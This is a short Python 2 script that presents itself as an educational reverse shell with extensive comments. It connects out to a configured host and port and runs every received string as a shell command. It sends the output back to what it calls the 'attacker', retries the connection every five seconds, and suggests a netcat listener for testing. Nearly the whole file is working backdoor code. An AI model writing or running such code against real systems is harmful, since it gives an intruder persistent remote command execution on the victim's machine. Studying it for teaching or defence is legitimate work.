""" A simple reverse shell. Extensive comments were added for educational purposes
    In order to test the code you will need to run a server to listen to client's port.
    You can try netcat command : nc -l -k  [port] (E.g nc -l -k  5002)	
"""


# Set the host and the port.
HOST = "127.0.0.1"
PORT = 5002

# 
def connect((host, port)):
	# AF represents the Address Family, first argument to socket().
	# The second argument represents the socket type. 
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s

def wait_for_command(s):
	"""socket.recv(bufsize[, flags]).
	Receive data from the socket.
	The return value is a string representing the data received."""

	data = s.recv(1024)
	if data == "quit\n":
		s.close()
		sys.exit(0)
	# the socket died
	elif len(data)==0:
		return True
	else:
		
		""" subprocess module allows you to spawn new processes,
		connect to their input/output/error pipes, and obtain their return codes.
		Refer to for more info http://docs.python.org/2/library/subprocess.html#subprocess.Popen """
		# do shell command
		proc = subprocess.Popen(data, shell=True,
			stdout=subprocess.PIPE, stderr=subprocess.PIPE,
			stdin=subprocess.PIPE)
		# read output
		stdout_value = proc.stdout.read() + proc.stderr.read()
		# send output to "attacker"
		s.send(stdout_value)
		return False

def main():
	while True:
		socket_died=False
		try:
			s=connect((HOST,PORT))
			while not socket_died:
				socket_died=wait_for_command(s)
			s.close()
		except socket.error:
			pass
		time.sleep(5)

if __name__ == "__main__":
	import sys,os,subprocess,socket,time
	sys.exit(main())
